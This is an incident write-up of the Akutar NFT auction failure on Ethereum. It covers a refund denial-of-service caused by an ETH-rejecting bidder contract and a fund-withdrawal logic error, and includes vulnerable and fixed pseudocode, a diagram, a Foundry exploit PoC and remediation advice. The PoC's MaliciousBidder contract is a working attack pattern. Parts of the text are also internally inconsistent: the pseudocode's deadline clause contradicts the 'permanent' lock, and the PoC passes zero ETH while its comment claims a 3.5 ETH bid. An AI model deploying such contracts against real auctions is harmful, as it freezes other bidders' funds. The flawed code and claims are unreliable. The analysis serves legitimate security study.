# Akutar NFT — DoS Refund Blockage and Permanent Project Fund Lock Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-22 |
| **Protocol** | Akutar NFT (Akutars) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$34,000,000 (project funds permanently locked) |
| **Attacker** | Malicious bidder contract (intentional DoS) |
| **Vulnerable Contract** | Akutar NFT [0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d](https://etherscan.io/address/0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d) |
| **Root Cause** | 1) When the bidder is a contract, a fallback revert during ETH refund can DoS the entire refund process; 2) A logic error in `claimProjectFunds()` require condition permanently prevents project fund withdrawal |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/AkutarNFT_exp.sol) |

---
## 1. Vulnerability Overview

The Akutar NFT auction contained two independent critical bugs.

**Bug 1: processRefunds() DoS**
The refund processing function `processRefunds()` sends ETH to all bidders sequentially. If any bidder is a contract that rejects ETH (reverts in its fallback), the entire refund process halts. A malicious contract placed a bid of 3.5 ETH and then blocked all refunds.

**Bug 2: claimProjectFunds() Logic Error**
The project fund withdrawal condition `require(processed == bids.length || block.timestamp > deadline)` requires that `processRefunds()` be fully completed. Because Bug 1 prevents refunds from ever completing, project funds become permanently locked as well.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable processRefunds() (pseudocode)
contract AkutarNFT {
    struct Bid {
        address payable bidder;
        uint256 amount;
    }
    Bid[] public bids;
    uint256 public processed;

    // ❌ Sends ETH to bidders sequentially — one failure halts everything
    function processRefunds() external {
        for (uint256 i = processed; i < bids.length; i++) {
            Bid memory bid = bids[i];
            // ❌ Contract bidder reverts in fallback → entire loop halted
            (bool success,) = bid.bidder.call{value: bid.amount}("");
            require(success, "refund failed");  // ← entire revert on failure
            processed++;
        }
    }

    // ❌ processRefunds completion is a prerequisite
    function claimProjectFunds() external onlyOwner {
        // ❌ processed == bids.length requires processRefunds to fully complete
        // Due to Bug 1, this condition can never be satisfied
        require(processed == bids.length || block.timestamp > deadline,
                "refunds not processed");
        payable(owner).transfer(address(this).balance);
    }
}

// ✅ Correct pattern (Pull-over-Push)
contract AkutarNFTFixed {
    mapping(address => uint256) public pendingRefunds;

    // ✅ Record balances instead of directly sending refunds
    function processRefunds() external {
        for (uint256 i = processed; i < bids.length; i++) {
            pendingRefunds[bids[i].bidder] += bids[i].amount;
            processed++;
        }
    }

    // ✅ Each user claims their own refund
    function claimRefund() external {
        uint256 amount = pendingRefunds[msg.sender];
        require(amount > 0, "no refund");
        pendingRefunds[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "refund failed");
    }

    // ✅ Project funds managed independently from refund processing
    function claimProjectFunds() external onlyOwner {
        require(block.timestamp > auctionEndTime + 7 days, "too early");
        payable(owner).transfer(projectFunds);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**AkuAuction.sol** — Entry point:
```solidity
// ❌ Root cause: 1) When bidder is a contract, fallback revert during ETH refund can DoS the entire refund process; 2) `claimProjectFunds()` require logic error
    function claimProjectFunds() external onlyOwner {
        require(block.timestamp > expiresAt, "Auction still in progress");
        require(refundProgress >= totalBids, "Refunds not yet processed");
        require(akuNFTs.airdropProgress() >= totalBids, "Airdrop not complete");

        (bool sent, ) = project.call{value: address(this).balance}("");  // ❌ Arbitrary external call
        require(sent, "Failed to withdraw");        
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Malicious Contract (ETH-rejecting fallback)
    │
    ├─[1] Bids 3.5 ETH in the auction
    │       Malicious contract address included in bids array
    │
    ├─[2] Honest user outbids with 3.75 ETH
    │       Auction ends
    │
    ├─[3] processRefunds() called
    │       i=0: Attempts to send 3.5 ETH to malicious contract
    │           ↓
    │   Malicious contract fallback: revert("I reject ETH")
    │           ↓
    │   require(success) fails → entire function reverts
    │
    ├─[4] processRefunds() completely blocked
    │       processed remains 0
    │       Honest users also cannot receive refunds
    │
    ├─[5] claimProjectFunds() call attempted
    │       require(processed == bids.length) → false
    │       require(block.timestamp > deadline) → false (deadline not yet passed)
    │       → revert
    │
    └─[6] ~$34M ETH permanently locked in contract
```

---
## 4. PoC Code (Core Logic)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IAkutarNFT {
    function bid() external payable;
    function processRefunds() external;
    function claimProjectFunds() external;
}

// ⚡ Malicious contract that rejects ETH refunds
contract MaliciousBidder {
    IAkutarNFT akutar;

    constructor(address _akutar) {
        akutar = IAkutarNFT(_akutar);
    }

    function attack() external payable {
        // Place bid in auction (with ETH)
        akutar.bid{value: msg.value}();
    }

    // ⚡ Revert in fallback: reject refund ETH
    receive() external payable {
        revert("I reject your refund!");
    }
}

contract ContractTest is Test {
    IAkutarNFT akutar =
        IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);
    address honestUser  = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;
    address projectOwner = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_636_844);
    }

    function testExploit() public {
        // [Step 1] Deploy malicious contract and bid 3.5 ETH
        MaliciousBidder malicious = new MaliciousBidder(address(akutar));
        vm.deal(address(malicious), 3.5 ether);
        malicious.attack{value: 0}(); // Internally bids 3.5 ETH

        // [Step 2] Honest user bids 3.75 ETH
        vm.deal(honestUser, 3.75 ether);
        vm.prank(honestUser);
        akutar.bid{value: 3.75 ether}();

        // [Step 3] Simulate auction time expiry
        vm.warp(1_650_674_809 + 1);

        // [Step 4] processRefunds attempt → malicious contract reverts → total failure
        vm.expectRevert();
        akutar.processRefunds();

        emit log_string("[Bug 1] processRefunds permanently blocked by malicious bidder");

        // [Step 5] claimProjectFunds attempt → processed condition not met → revert
        vm.prank(projectOwner);
        vm.expectRevert();
        akutar.claimProjectFunds();

        emit log_string("[Bug 2] Project funds permanently locked - ~$34M");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | DoS (Denial of Service) + Business Logic Error |
| **CWE** | CWE-400: Uncontrolled Resource Consumption (DoS) |
| **OWASP DeFi** | Push Payment Pattern DoS + Fund Lockup |
| **Attack Vector** | ETH-rejecting contract bid → processRefunds DoS |
| **Precondition** | Auction participation open (anyone) |
| **Impact** | All refunds blocked + $34M project funds permanently locked |

---
## 6. Remediation Recommendations

1. **Pull-over-Push Pattern**: Instead of directly sending ETH, record balances and let users claim their own refunds.
2. **Use try-catch**: Handle refund failures as skips rather than halting the entire process.
3. **Independent Fund Management**: Manage project funds and user refunds separately so they do not affect each other.
4. **Restrict Contract Bidders**: Add `require(msg.sender == tx.origin)` to allow only EOA bids, or manage contract bidder deposits separately.

---
## 7. Lessons Learned

- **Push vs Pull**: In the Push pattern of directly sending ETH, if the recipient reverts, the entire process halts. The Pull pattern is far safer.
- **Dependency Chain**: A design where `claimProjectFunds` depends on `processRefunds` completion creates a single point of failure — if one is blocked, the other is too.
- **$34M Permanently Locked**: The outcome here was a lock rather than a theft — a unique result that demonstrates how devastating smart contract immutability can be when combined with design errors.
- **Auction Contract Design**: ETH handling logic in NFT auctions must be designed with exceptional care.